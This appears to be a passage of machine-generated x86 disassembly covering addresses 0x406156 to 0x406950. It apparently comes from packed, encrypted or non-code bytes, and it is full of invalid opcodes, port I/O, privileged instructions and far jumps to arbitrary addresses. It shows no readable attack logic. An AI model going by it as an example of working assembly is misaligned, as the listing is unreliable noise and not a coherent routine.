  406156:	fs sbb al,0x7a
  406159:	imul   ebp,DWORD PTR [ebp-0x4f850876],0x27
  406160:	mov    al,0xc2
  406162:	mov    eax,0xc36a712d
  406167:	out    0xd,al
  406169:	jne    0x406121
  40616b:	and    eax,0x58f65380
  406170:	ins    DWORD PTR es:[edi],dx
  406171:	mov    esp,0xb6bc71c0
  406176:	fistp  WORD PTR [eax]
  406178:	xchg   esp,eax
  406179:	xchg   edi,eax
  40617a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40617b:	sbb    al,0x3b
  40617d:	inc    ebp
  40617e:	rcl    bl,0xa6
  406181:	cmp    eax,0xa1c770f6
  406186:	fld    TBYTE PTR [esp+eiz*2]
  406189:	in     eax,dx
  40618a:	(bad)  
  40618b:	cmpps  xmm4,XMMWORD PTR [eax-0x68],0x28
  406190:	test   eax,0x7ca717ec
  406195:	dec    edi
  406196:	mov    al,ds:0x1a51fbb9
  40619b:	into   
  40619c:	add    edi,edx
  40619e:	pop    eax
  40619f:	sub    eax,0x9a873e5d
  4061a4:	jmp    0xa4b4:0x43fada52
  4061ab:	into   
  4061ac:	aam    0x2f
  4061ae:	and    BYTE PTR [edi+eax*2+0x1319affa],0xdc
  4061b6:	lods   al,BYTE PTR ds:[esi]
  4061b7:	dec    ebx
  4061b8:	or     edx,ecx
  4061ba:	stc    
  4061bb:	aad    0xba
  4061bd:	sbb    dl,BYTE PTR [ecx+0x1]
  4061c0:	pop    edi
  4061c1:	call   0x581f:0x32b4f4d8
  4061c8:	stos   DWORD PTR es:[edi],eax
  4061c9:	mov    dh,0x23
  4061cb:	in     al,dx
  4061cc:	pusha  
  4061cd:	test   eax,0x8cd45ab2
  4061d2:	mov    ds:0xcfea750d,eax
  4061d7:	xor    eax,0x3ec5d4de
  4061dc:	sub    esp,DWORD PTR [esi+0x45]
  4061df:	lahf   
  4061e0:	or     ah,cl
  4061e2:	sti    
  4061e3:	add    eax,0x25933856
  4061e8:	add    eax,0xce4523f8
  4061ed:	sbb    BYTE PTR [ecx],ah
  4061ef:	jmp    0x518e2e95
  4061f4:	popf   
  4061f5:	sbb    al,0x98
  4061f7:	and    eax,0x7be0ab71
  4061fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061fd:	sbb    ch,BYTE PTR ds:0xc0323c9f
  406203:	test   al,0x20
  406205:	nop
  406206:	jecxz  0x4061e7
  406208:	adc    BYTE PTR [edx-0x57423c91],bh
  40620e:	(bad)  
  406210:	inc    esi
  406211:	and    eax,0x9e6eb07c
  406216:	lock add eax,ecx
  406219:	or     edi,esp
  40621b:	push   esp
  40621c:	stc    
  40621d:	fisttp WORD PTR [ebx-0xa2b2989]
  406223:	xacquire xchg DWORD PTR [eax+0x74bdcdf1],edx
  40622a:	scas   al,BYTE PTR es:[edi]
  40622b:	out    0x51,eax
  40622d:	hlt    
  40622e:	ds cmc 
  406230:	push   ebx
  406231:	mov    WORD PTR [esi],fs
  406233:	in     al,0x33
  406235:	jp     0x40622e
  406237:	adc    DWORD PTR [edi+0x68],0x18
  40623b:	lods   eax,DWORD PTR ds:[esi]
  40623c:	push   es
  40623d:	pusha  
  40623e:	jb     0x4061c1
  406240:	shl    DWORD PTR [edx-0x1ec728f2],1
  406246:	je     0x406230
  406248:	cmp    BYTE PTR [eax+edi*4-0x6b],dh
  40624c:	ss ins DWORD PTR es:[edi],dx
  40624e:	xchg   esp,eax
  40624f:	icebp  
  406250:	(bad)  
  406251:	adc    BYTE PTR [ebx+edx*1+0x272190b5],al
  406258:	in     eax,dx
  406259:	sbb    DWORD PTR [edx-0x33b7161],ecx
  40625f:	xor    BYTE PTR [esi+0x5],cl
  406262:	add    dl,ah
  406264:	cdq    
  406265:	ins    DWORD PTR es:[edi],dx
  406266:	adc    al,0xf1
  406268:	arpl   WORD PTR [esi-0x14925832],dx
  40626e:	out    0xab,eax
  406270:	sub    ah,bh
  406272:	fist   WORD PTR es:[edx]
  406275:	push   0xb88b4837
  40627a:	(bad)  
  40627b:	js     0x406219
  40627d:	inc    ecx
  40627e:	mov    esp,0xe910ccf
  406283:	jecxz  0x4062f3
  406285:	out    dx,al
  406286:	sbb    al,0x2f
  406288:	jg     0x4062db
  40628a:	fadd   DWORD PTR [ecx+ecx*4-0x6313f429]
  406291:	test   al,0xb7
  406293:	sar    BYTE PTR [eax-0x59],1
  406296:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406297:	dec    esi
  406298:	call   0x8008:0x57f15f2
  40629f:	pop    esi
  4062a0:	mov    esi,0x9d0433a3
  4062a5:	call   DWORD PTR [ebp-0x44d954ce]
  4062ab:	hlt    
  4062ac:	jecxz  0x4062ab
  4062ae:	jbe    0x4062af
  4062b0:	mov    ebx,0x36cc7c99
  4062b5:	mov    dl,0xaa
  4062b7:	add    BYTE PTR [ebx-0x70],dh
  4062ba:	repnz add edi,DWORD PTR [esi]
  4062bd:	(bad)  
  4062be:	cmp    DWORD PTR [edi],ebx
  4062c0:	and    BYTE PTR [ebp+0x683f38f9],cl
  4062c6:	icebp  
  4062c7:	inc    ebp
  4062c8:	addr16 cs mov edi,0x1ba64f7
  4062cf:	fs pop es
  4062d1:	mov    cl,0x22
  4062d3:	out    dx,al
  4062d4:	inc    edx
  4062d5:	add    ebx,edx
  4062d7:	cmp    edi,DWORD PTR [ecx-0x25]
  4062da:	cs out 0x11,al
  4062dd:	mov    edx,0x8bc5fa22
  4062e2:	lods   al,BYTE PTR ds:[esi]
  4062e3:	or     al,0x1d
  4062e5:	aas    
  4062e6:	test   eax,0x52b4eee2
  4062eb:	in     eax,0x9f
  4062ed:	shl    DWORD PTR [ebp+0xf],0xa3
  4062f1:	push   esp
  4062f2:	dec    esp
  4062f3:	into   
  4062f4:	lahf   
  4062f5:	jmp    0x40627c
  4062f7:	adc    eax,0x3e8036bc
  4062fc:	push   edi
  4062fd:	aam    0xb
  4062ff:	xor    al,0x39
  406301:	jb     0x4062a6
  406303:	cmp    DWORD PTR [edi+0x83134e5],ecx
  406309:	jae    0x4062c0
  40630b:	jb     0x406328
  40630d:	retf   
  40630e:	shl    DWORD PTR [esi+0x5],0xc3
  406312:	loop   0x40629a
  406314:	das    
  406315:	sub    eax,0xee2f0718
  40631a:	fnstenv [edi+0x51]
  40631d:	cmc    
  40631e:	shr    DWORD PTR [ecx],cl
  406320:	adc    BYTE PTR [ebx+0x34],ah
  406323:	inc    esi
  406324:	scas   eax,DWORD PTR es:[edi]
  406325:	fld    TBYTE PTR ds:0xcd8ecdbf
  40632b:	mov    eax,0x5571f6a2
  406330:	pushf  
  406331:	test   BYTE PTR [ecx+ebx*8+0x512c30aa],al
  406338:	dec    esi
  406339:	inc    ebp
  40633a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40633b:	sahf   
  40633c:	sub    al,0x6e
  40633e:	cmp    al,BYTE PTR [edi-0x1a1aeee4]
  406344:	daa    
  406345:	and    BYTE PTR [esp+ebp*8],ah
  406348:	cmp    BYTE PTR [ecx],ch
  40634a:	rcr    DWORD PTR [esi+0x6e268a2c],0x38
  406351:	(bad)  
  406352:	mov    bl,0x5d
  406354:	ficomp WORD PTR [ecx+ebp*2-0x405a9da7]
  40635b:	rol    BYTE PTR [ebx+ebp*1-0x5],cl
  40635f:	mov    al,BYTE PTR [edx-0x45]
  406362:	out    0xfa,eax
  406364:	out    0xe8,eax
  406366:	pop    ebp
  406367:	data16 scas al,BYTE PTR es:[edi]
  406369:	cmp    DWORD PTR [ebx],esi
  40636b:	or     eax,0x701672b9
  406370:	nop
  406371:	sub    DWORD PTR [eax],edx
  406373:	dec    ecx
  406374:	push   es
  406375:	(bad)  
  406376:	xor    bl,ah
  406378:	addr16 out dx,eax
  40637a:	add    DWORD PTR [ecx-0x59564f13],esi
  406380:	push   DWORD PTR [edi+0xf]
  406383:	jne    0x4063dc
  406385:	loope  0x4063c9
  406387:	xchg   edi,eax
  406388:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406389:	jmp    0x9cfa:0xa133626d
  406390:	test   BYTE PTR [ebx-0x58],bl
  406393:	icebp  
  406394:	mov    dh,0x33
  406396:	sub    DWORD PTR [ecx],eax
  406398:	push   ss
  406399:	clc    
  40639a:	cmp    DWORD PTR [esi],edi
  40639c:	pop    ecx
  40639d:	xor    al,0x96
  40639f:	js     0x4063b3
  4063a1:	dec    edx
  4063a2:	sub    BYTE PTR [esi],0xab
  4063a5:	popf   
  4063a6:	xor    ebp,eax
  4063a8:	stos   DWORD PTR es:[edi],eax
  4063a9:	adc    DWORD PTR [edx],esp
  4063ab:	dec    esi
  4063ac:	mov    bh,0x14
  4063ae:	adc    bl,BYTE PTR [eax]
  4063b0:	pop    esp
  4063b1:	clc    
  4063b2:	or     ecx,eax
  4063b4:	lods   eax,DWORD PTR ds:[esi]
  4063b5:	fstp   TBYTE PTR [ebx+0x76]
  4063b8:	loop   0x406392
  4063ba:	inc    esp
  4063bb:	mov    ecx,0x87ff3b28
  4063c0:	pop    esi
  4063c1:	aam    0xf7
  4063c3:	ficom  DWORD PTR [esi+ebp*2-0x44]
  4063c7:	mov    dl,0x83
  4063c9:	fld    QWORD PTR [eax]
  4063cb:	cs loop 0x4063e9
  4063ce:	mov    ebx,0x4f0a3857
  4063d3:	jg     0x4063b7
  4063d5:	or     BYTE PTR [edi+0x44],ah
  4063d8:	xor    al,0x7f
  4063da:	push   0xf643b475
  4063df:	int3   
  4063e0:	test   BYTE PTR [ebx-0x75f0e250],0x76
  4063e7:	ss inc edi
  4063e9:	adc    al,0x24
  4063eb:	(bad)  
  4063ec:	mov    edx,0x904bd9b3
  4063f1:	mov    eax,0x9a1f803e
  4063f6:	adc    edi,DWORD PTR [ebp+0x4]
  4063f9:	lods   eax,DWORD PTR ds:[esi]
  4063fa:	clc    
  4063fb:	les    ebp,FWORD PTR [ecx+0x2c]
  4063fe:	mov    dl,0x0
  406400:	rol    DWORD PTR [esi+0x52],0xd0
  406404:	xchg   cl,ah
  406406:	cmc    
  406407:	mov    ebp,0xf0965865
  40640c:	test   BYTE PTR [edx],dh
  40640e:	lea    ecx,[edx+0x4fac77af]
  406414:	mov    edi,0xcad382cf
  406419:	xor    eax,0xa9f443c
  40641e:	int3   
  40641f:	mov    BYTE PTR ds:[ebx+0x3202322c],0x13
  406427:	jo     0x40646f
  406429:	jp     0x4063e3
  40642b:	cmc    
  40642c:	jne    0x4063d1
  40642e:	imul   esi,DWORD PTR [edx+0xf],0xbdd14ce0
  406435:	inc    esp
  406436:	inc    ebp
  406437:	js     0x406406
  406439:	or     ecx,edx
  40643b:	inc    esp
  40643c:	pop    edi
  40643d:	fbld   TBYTE PTR [eax+0x70]
  406440:	jge    0x406471
  406442:	fldcw  WORD PTR [ecx+0x5]
  406445:	sub    DWORD PTR [eax+esi*2-0x1b],esp
  406449:	add    edx,DWORD PTR [esi+ebp*2+0x367eb31f]
  406450:	int3   
  406451:	xor    eax,0x72352472
  406456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406457:	(bad)
  40645a:	lods   al,BYTE PTR ds:[esi]
  40645b:	mov    ds:0x43552fb4,eax
  406460:	pushf  
  406461:	mov    bh,0x89
  406463:	out    dx,eax
  406464:	mov    al,0x18
  406466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406467:	aam    0x66
  406469:	push   ss
  40646a:	or     dh,bl
  40646c:	inc    edx
  40646d:	add    DWORD PTR [eax+0x625de29],ebx
  406473:	int    0x58
  406475:	push   0xfffffff1
  406477:	imul   esi,DWORD PTR [eax],0x3b
  40647a:	mov    ebx,0x6caa06bd
  40647f:	jle    0x4064e9
  406481:	lods   eax,DWORD PTR ds:[esi]
  406482:	jecxz  0x4064c6
  406484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406485:	mov    esi,0xcc7125f1
  40648a:	mov    esi,DWORD PTR [edx+edx*4-0x17eb9768]
  406491:	inc    ecx
  406492:	icebp  
  406493:	rcr    DWORD PTR [edi-0x3e1a4b4f],0xed
  40649a:	xor    al,0xf6
  40649c:	mov    dl,0xd1
  40649e:	sbb    ah,BYTE PTR [edi]
  4064a0:	mul    BYTE PTR ds:0x4c418260
  4064a6:	stos   DWORD PTR es:[edi],eax
  4064a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064a8:	xchg   edx,eax
  4064a9:	retf   0xed3c
  4064ac:	pop    ebp
  4064ad:	stos   DWORD PTR es:[edi],eax
  4064ae:	lahf   
  4064af:	xchg   ebx,eax
  4064b0:	into   
  4064b1:	cmp    eax,esi
  4064b3:	or     BYTE PTR [edx+ebx*2],dh
  4064b6:	sub    edx,DWORD PTR [eax-0x71]
  4064b9:	push   ds
  4064ba:	jl     0x40651b
  4064bc:	pop    edi
  4064bd:	stos   BYTE PTR es:[edi],al
  4064be:	ret    
  4064bf:	jno    0x4064f5
  4064c1:	xor    ecx,ebp
  4064c3:	jge    0x406482
  4064c5:	pop    ds
  4064c6:	das    
  4064c7:	es inc ebx
  4064c9:	add    edi,DWORD PTR [edx+edx*4-0x75b55734]
  4064d0:	pop    ebp
  4064d1:	dec    esp
  4064d2:	jb     0x406497
  4064d4:	dec    edx
  4064d5:	icebp  
  4064d6:	push   ebx
  4064d7:	fistp  QWORD PTR [edx+edi*2]
  4064da:	mov    bl,0xc
  4064dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064dd:	adc    BYTE PTR [ecx],dh
  4064df:	or     DWORD PTR [ecx-0x26],edi
  4064e2:	inc    edi
  4064e3:	cmp    edi,edi
  4064e5:	push   eax
  4064e6:	aas    
  4064e7:	jle    0x4064fb
  4064e9:	ror    BYTE PTR [eax],cl
  4064eb:	hlt    
  4064ec:	and    al,0xaa
  4064ee:	push   ds
  4064ef:	push   edi
  4064f0:	aad    0x3
  4064f2:	dec    BYTE PTR [edi+edi*1]
  4064f5:	dec    BYTE PTR [eax+0x58]
  4064f8:	pop    edi
  4064f9:	push   ebx
  4064fa:	test   BYTE PTR [edi-0x16],ch
  4064fd:	cmp    DWORD PTR [ecx],edi
  4064ff:	jne    0x4064f7
  406501:	inc    ebp
  406502:	fst    QWORD PTR [ecx+0x1a]
  406505:	addr16 pop ss
  406507:	daa    
  406508:	sbb    bh,BYTE PTR [edi-0x26]
  40650b:	aam    0x8a
  40650d:	adc    al,0xac
  40650f:	(bad)  
  406510:	dec    ebp
  406511:	jo     0x406578
  406513:	jecxz  0x4064c1
  406515:	or     BYTE PTR [edx-0x32b0c8d0],cl
  40651b:	test   DWORD PTR [ebx-0x25e60436],0xafeda5a5
  406525:	test   BYTE PTR [esi-0x4f],bl
  406528:	jb     0x40658d
  40652a:	stos   BYTE PTR es:[edi],al
  40652b:	xchg   ebx,eax
  40652c:	(bad)  
  40652d:	xor    dh,BYTE PTR [ebx+esi*4-0x1c]
  406531:	inc    edi
  406532:	xchg   ebp,eax
  406533:	inc    esp
  406534:	leave  
  406535:	mov    bl,0xd0
  406537:	adc    ch,al
  406539:	ds jns 0x406580
  40653c:	xor    dh,al
  40653e:	js     0x40650a
  406540:	aas    
  406541:	lea    eax,[ebp-0x270d4810]
  406547:	nop
  406548:	out    dx,eax
  406549:	xchg   ebx,eax
  40654a:	inc    edi
  40654b:	pop    eax
  40654c:	mov    eax,0xfb647b98
  406551:	xchg   ebx,eax
  406552:	inc    eax
  406553:	pop    esi
  406554:	call   0x280e:0x79b4b7b7
  40655b:	mov    ah,ch
  40655d:	jnp    0x406592
  40655f:	int    0x49
  406561:	dec    BYTE PTR [ebx-0x53]
  406564:	mov    ebx,0x5c878ab2
  406569:	loop   0x4064eb
  40656b:	or     DWORD PTR [edi-0x645460eb],0x5e
  406572:	mov    bl,0x73
  406574:	dec    eax
  406575:	gs mov dh,dh
  406578:	data16 mov ch,0xb0
  40657b:	enter  0xfb1,0x7
  40657f:	ds dec ebx
  406581:	in     al,0xdd
  406583:	or     DWORD PTR [edx],esi
  406585:	and    al,0xd5
  406587:	cmp    edi,edx
  406589:	out    dx,al
  40658a:	add    al,BYTE PTR [eax+ebx*8+0x143784d]
  406591:	(bad)  
  406592:	mov    dl,0x18
  406594:	sub    ch,BYTE PTR [eax-0x25ad7fc9]
  40659a:	jg     0x406590
  40659c:	add    ecx,DWORD PTR [ecx]
  40659e:	ret    
  40659f:	out    dx,al
  4065a0:	in     al,0x1c
  4065a2:	mov    eax,0x9ddfec46
  4065a7:	sub    DWORD PTR [edx-0x23],esi
  4065aa:	shl    ah,0x8e
  4065ad:	xor    edi,DWORD PTR [edi-0x59]
  4065b0:	push   ecx
  4065b1:	aaa    
  4065b2:	(bad)  
  4065b3:	loope  0x406594
  4065b5:	adc    eax,0xc1063e35
  4065ba:	sets   BYTE PTR [ecx-0x13]
  4065be:	push   ss
  4065bf:	and    edx,DWORD PTR [eax+0x76]
  4065c2:	mov    ?,ebx
  4065c4:	sub    BYTE PTR [ecx+eiz*4],0x81
  4065c8:	sti    
  4065c9:	adc    BYTE PTR ds:0xf2c52a5a,0xc5
  4065d0:	popa   
  4065d1:	and    esp,edi
  4065d3:	rcl    BYTE PTR [ebp+0x5a],1
  4065d6:	repnz sub BYTE PTR [edx+eiz*1-0x22ea4065],0x34
  4065df:	ins    DWORD PTR es:[edi],dx
  4065e0:	xchg   ebx,eax
  4065e1:	cli    
  4065e2:	test   eax,0xd95d2137
  4065e7:	cld    
  4065e8:	jmp    0x406574
  4065ea:	into   
  4065eb:	loopne 0x40664e
  4065ed:	pop    ecx
  4065ee:	inc    edx
  4065ef:	stos   BYTE PTR es:[edi],al
  4065f0:	jle    0x4065d3
  4065f2:	pushf  
  4065f3:	xor    BYTE PTR [edi-0xa2a3c99],bh
  4065f9:	aas    
  4065fa:	daa    
  4065fb:	outs   dx,BYTE PTR ds:[esi]
  4065fc:	mov    esi,0xf689bdc1
  406601:	dec    edi
  406602:	jmp    0xaffb:0x663517b9
  406609:	mov    dh,0x86
  40660b:	popa   
  40660c:	push   ebx
  40660d:	xor    DWORD PTR [ebp+ebp*1-0x68],edx
  406611:	pop    ebx
  406612:	clc    
  406613:	lahf   
  406614:	inc    esi
  406615:	xor    bh,dh
  406617:	push   cs
  406618:	add    dl,ah
  40661a:	not    DWORD PTR ds:0x21ecc4f3
  406620:	pusha  
  406621:	xchg   edi,eax
  406622:	and    BYTE PTR [esi+0x66],ah
  406625:	imul   ecx
  406627:	cmp    eax,0x15c42ab
  40662c:	imul   ebp,DWORD PTR [edx-0x3a4a923],0x19
  406633:	cmp    eax,0xc68a5897
  406638:	and    eax,DWORD PTR [edx-0x24630e2]
  40663e:	sysret 
  406640:	or     al,0x79
  406642:	jne    0x4065dd
  406644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406645:	ja     0x4066b0
  406647:	adc    eax,0xd52a225
  40664c:	in     al,dx
  40664d:	fs xor al,0x4f
  406650:	cmp    eax,0xd50413f8
  406655:	leave  
  406656:	and    BYTE PTR [esp+ebp*2-0x13382219],al
  40665d:	mov    bh,0x98
  40665f:	scas   eax,DWORD PTR es:[edi]
  406660:	out    dx,al
  406661:	add    ecx,DWORD PTR [edi-0x6185ce76]
  406667:	inc    esp
  406668:	imul   esp,DWORD PTR [esi+ebx*1],0xeaa71b27
  40666f:	mov    al,dl
  406671:	scas   al,BYTE PTR es:[edi]
  406672:	mov    edx,0xd58d2e90
  406677:	sub    al,BYTE PTR [ecx+0x7acdb28b]
  40667d:	int    0x92
  40667f:	iret   
  406680:	mov    ?,ecx
  406682:	mov    BYTE PTR [esi],ah
  406684:	mov    edi,0x6dfad30a
  406689:	dec    ebp
  40668a:	push   edx
  40668b:	(bad)  
  40668c:	mov    al,ds:0x5c421bca
  406691:	push   ds
  406692:	mov    cl,0x3a
  406694:	rcl    bh,cl
  406696:	in     al,0xd5
  406698:	mov    ?,WORD PTR [ebx-0x7dc0b822]
  40669e:	lods   al,BYTE PTR ds:[esi]
  40669f:	les    edi,FWORD PTR [ecx+0x19]
  4066a2:	mov    esp,0x94ce2158
  4066a7:	xor    al,0xb4
  4066a9:	sub    al,0xa5
  4066ab:	mov    al,ds:0x7963e86a
  4066b0:	retf   0x15da
  4066b3:	out    0xd3,eax
  4066b5:	shr    ecx,0x95
  4066b8:	stc    
  4066b9:	inc    esp
  4066ba:	idiv   DWORD PTR [ecx]
  4066bc:	and    ecx,DWORD PTR ds:0x7166262d
  4066c2:	xchg   edx,eax
  4066c3:	(bad)  
  4066c4:	out    dx,al
  4066c5:	das    
  4066c6:	inc    edx
  4066c7:	dec    ebx
  4066c8:	pusha  
  4066c9:	(bad)  
  4066ca:	test   BYTE PTR [esi+0x1d6217aa],0xef
  4066d1:	sub    DWORD PTR es:[edi-0x79],0x6e2f0551
  4066d9:	and    BYTE PTR [ebx],al
  4066db:	arpl   WORD PTR [ebp+0x2c],di
  4066de:	aas    
  4066df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e0:	xor    DWORD PTR [edi+0x360d6969],ecx
  4066e6:	mov    edx,0xce433720
  4066eb:	mov    ds:0x740b0817,al
  4066f0:	mov    ebp,0xdd7997a3
  4066f5:	mov    es,WORD PTR [ebx-0x6e]
  4066f8:	shl    DWORD PTR [eax+ebp*2],0x58
  4066fc:	inc    esp
  4066fd:	lahf   
  4066fe:	(bad)  
  4066ff:	adc    BYTE PTR [edi],ah
  406701:	lea    ebx,[ebx-0x3a2a52ad]
  406707:	imul   ebx,ebx,0x92824250
  40670d:	loop   0x4066f6
  40670f:	sub    BYTE PTR [ebx+edx*1-0x5611bde7],al
  406716:	sbb    eax,0x46
  406719:	(bad)  
  40671a:	daa    
  40671b:	js     0x40673e
  40671d:	ss mov WORD PTR cs:[edi],es
  406721:	(bad)  
  406722:	mov    dl,0xb2
  406724:	mov    dl,0xd1
  406726:	sub    ebx,DWORD PTR [ebx+0x2cca2e74]
  40672c:	and    DWORD PTR ds:0x18fb9e4d,ebp
  406732:	sub    BYTE PTR [edx],0x7e
  406735:	jmp    0xdec5dd5a
  40673a:	repnz arpl WORD PTR [ebx+0x356cb81],si
  406741:	cmp    dh,BYTE PTR [eax+0x65]
  406744:	xchg   esp,eax
  406745:	push   es
  406746:	inc    ebx
  406747:	sub    eax,0xf4d0bd0f
  40674c:	or     DWORD PTR [edx-0x7c],0xf070de5d
  406753:	fs jnp 0x406785
  406756:	or     ah,bl
  406758:	xchg   ebp,eax
  406759:	imul   ebp,edx,0x20c8fbc0
  40675f:	jecxz  0x4067bc
  406761:	ss stos BYTE PTR es:[edi],al
  406763:	enter  0x40dc,0xcd
  406767:	fwait
  406768:	shl    DWORD PTR [ecx+esi*8-0x14b0d1cd],cl
  40676f:	adc    dh,dh
  406771:	jnp    0x406797
  406773:	adc    al,0x37
  406775:	jbe    0x40679e
  406777:	xchg   ebp,eax
  406778:	psadbw mm3,QWORD PTR [edi-0x6f]
  40677c:	jo     0x40677f
  40677e:	mov    eax,0x9c156b17
  406783:	inc    esp
  406784:	add    DWORD PTR [esi],ecx
  406786:	mov    dl,0x3f
  406788:	ds pop es
  40678a:	or     ebp,esp
  40678c:	adc    eax,0x8b452725
  406791:	in     eax,dx
  406792:	outs   dx,DWORD PTR es:[esi]
  406794:	mov    al,ds:0x8dfe4e1e
  406799:	push   ebx
  40679a:	dec    ebx
  40679b:	pop    edi
  40679c:	sbb    DWORD PTR [ebx+0x7140930a],ebx
  4067a2:	jl     0x4067b1
  4067a4:	xchg   esp,eax
  4067a5:	cmp    dh,bl
  4067a7:	fcom   DWORD PTR [esp+eiz*2]
  4067aa:	or     al,0x94
  4067ac:	repz xadd BYTE PTR [ebx-0x66f12b58],cl
  4067b4:	sub    DWORD PTR [edi+0x30],edx
  4067b7:	test   BYTE PTR [ebx],ah
  4067b9:	push   ss
  4067ba:	pop    ecx
  4067bb:	or     esi,DWORD PTR [esi+0x3b]
  4067be:	sti    
  4067bf:	jle    0x4067d4
  4067c1:	aas    
  4067c2:	inc    esi
  4067c3:	repnz sbb esi,DWORD PTR [ecx-0x41f50783]
  4067ca:	jmp    0x4067d1
  4067cc:	sar    DWORD PTR [ebx+0x167394d3],cl
  4067d2:	sbb    al,0xdf
  4067d4:	call   0x5e3f9977
  4067d9:	xchg   ebp,eax
  4067da:	hlt    
  4067db:	adc    al,0x14
  4067dd:	xchg   ebx,eax
  4067de:	ror    DWORD PTR [edi+0x3d],0x0
  4067e2:	jmp    0x9722dcc6
  4067e7:	add    DWORD PTR [ebx],edi
  4067e9:	or     al,0xa4
  4067eb:	and    eax,0x877d1869
  4067f0:	dec    esp
  4067f1:	adc    edi,DWORD PTR [esi]
  4067f3:	data16 into 
  4067f5:	adc    esi,edi
  4067f7:	pushf  
  4067f8:	hlt    
  4067f9:	out    dx,eax
  4067fa:	gs push ebx
  4067fc:	push   DWORD PTR [ebp-0x22]
  4067ff:	cs cli 
  406801:	(bad)  
  406803:	loopne 0x40678a
  406805:	int    0x42
  406807:	sub    DWORD PTR [edi+0x4dd15dc5],0xef75f107
  406811:	aaa    
  406812:	fst    DWORD PTR [ebx+ebp*1]
  406815:	add    dh,BYTE PTR [eax-0x2a]
  406818:	call   0x665d:0x25065789
  40681f:	pop    ds
  406820:	add    dl,0x7a
  406823:	stos   DWORD PTR es:[edi],eax
  406824:	sub    esp,DWORD PTR [esi]
  406826:	sub    al,0xd2
  406828:	push   ecx
  406829:	inc    edi
  40682a:	das    
  40682b:	div    BYTE PTR [ebx+0x39]
  40682e:	xor    esp,esi
  406830:	xchg   esp,eax
  406831:	or     al,0x8e
  406834:	iret   
  406835:	jmp    0x7dc3:0x6b20fed8
  40683c:	mov    eax,0xd1c252f
  406841:	xchg   esi,eax
  406842:	test   al,0xb
  406844:	dec    esi
  406845:	jecxz  0x4068b6
  406847:	pusha  
  406848:	repnz (bad) 
  40684a:	cs mov al,0x81
  40684d:	dec    esi
  40684e:	or     cl,BYTE PTR [ebx-0x3a6eb858]
  406854:	fstp   QWORD PTR [edi]
  406856:	iret   
  406857:	sub    eax,0x6b2da5b0
  40685c:	inc    esi
  40685d:	or     DWORD PTR [ecx+0xa18b57b],ebx
  406863:	adc    al,ah
  406865:	sahf   
  406866:	scas   al,BYTE PTR es:[edi]
  406867:	xor    al,0x32
  406869:	inc    esi
  40686a:	ror    DWORD PTR [eax+0x7a],cl
  40686d:	ja     0x4068e1
  40686f:	add    al,BYTE PTR [edi-0x18]
  406872:	(bad)  
  406873:	mov    ecx,0x682a619c
  406878:	cdq    
  406879:	mov    bh,0xb4
  40687b:	mov    BYTE PTR [edi],dl
  40687d:	loope  0x406872
  40687f:	xor    ecx,0xca9d214f
  406885:	jne    0x40684e
  406887:	sbb    eax,0x5665a4fe
  40688c:	(bad)  
  40688d:	sbb    ah,BYTE PTR [edx]
  40688f:	pop    eax
  406890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406891:	mov    edi,0x5f783a96
  406896:	push   es
  406897:	inc    ecx
  406898:	mov    WORD PTR [ebp+0x77],?
  40689b:	mov    ebx,0xa4bb85a1
  4068a0:	daa    
  4068a1:	mov    eax,0x9a7816c0
  4068a6:	fwait
  4068a7:	gs jp  0x406879
  4068aa:	aas    
  4068ab:	stos   DWORD PTR es:[edi],eax
  4068ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068ad:	ins    BYTE PTR es:[edi],dx
  4068ae:	das    
  4068af:	jb     0x4068a2
  4068b1:	mov    esp,0xa56d6bfb
  4068b6:	out    dx,eax
  4068b7:	fwait
  4068b8:	stos   BYTE PTR es:[edi],al
  4068b9:	aad    0xa5
  4068bb:	(bad)  
  4068bc:	dec    ebx
  4068bd:	or     al,0x7
  4068bf:	gs dec edx
  4068c1:	push   ebp
  4068c2:	ja     0x406864
  4068c4:	add    BYTE PTR [esi-0x2b],0x25
  4068c8:	fstp   TBYTE PTR [ebp+0x5b]
  4068cb:	pushf  
  4068cc:	mov    eax,0x29cce174
  4068d1:	or     BYTE PTR [ebp+edi*8-0x5b96e00e],ch
  4068d8:	shl    BYTE PTR [esi],1
  4068da:	pop    edi
  4068db:	popa   
  4068dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068dd:	lock loopne 0x406911
  4068e0:	ficom  DWORD PTR [esi]
  4068e2:	push   cs
  4068e3:	rcr    BYTE PTR [edi+eiz*8-0x66],0x1b
  4068e8:	and    BYTE PTR [ebp-0x7989188f],bh
  4068ee:	pop    ss
  4068ef:	add    eax,0x252a4687
  4068f4:	ss push es
  4068f6:	lea    edx,[esi]
  4068f8:	stc    
  4068f9:	je     0x40687d
  4068fb:	ret    
  4068fc:	mov    ah,0xca
  4068fe:	ja     0x40697a
  406900:	cmp    al,0xb4
  406902:	add    BYTE PTR [esi+0x6accef40],bh
  406908:	gs mov dl,0x64
  40690b:	retf   0xc1ba
  40690e:	add    eax,0x7fb0efae
  406913:	ror    BYTE PTR [edi],0xed
  406916:	jecxz  0x40695d
  406918:	cdq    
  406919:	clc    
  40691a:	or     cl,cl
  40691c:	mov    es,WORD PTR [ebx+eax*2+0x3]
  406920:	or     al,BYTE PTR [eax-0x23]
  406923:	iret   
  406924:	pop    ss
  406925:	push   cs
  406926:	jecxz  0x4068bf
  406928:	add    bl,BYTE PTR [edi+eax*2]
  40692b:	test   eax,0x7c01a68
  406930:	xor    ecx,DWORD PTR [ebx+ebp*1-0x33d8ee5e]
  406937:	xor    eax,0x58f56051
  40693c:	jmp    0x727c:0xdf8ad5bd
  406943:	inc    ebp
  406944:	sub    eax,0xc8c7993f
  406949:	enter  0x97c1,0x3c
  40694d:	scas   eax,DWORD PTR es:[edi]
  40694e:	loope  0x4068f2
  406950:	jmp    0x925ea1b1
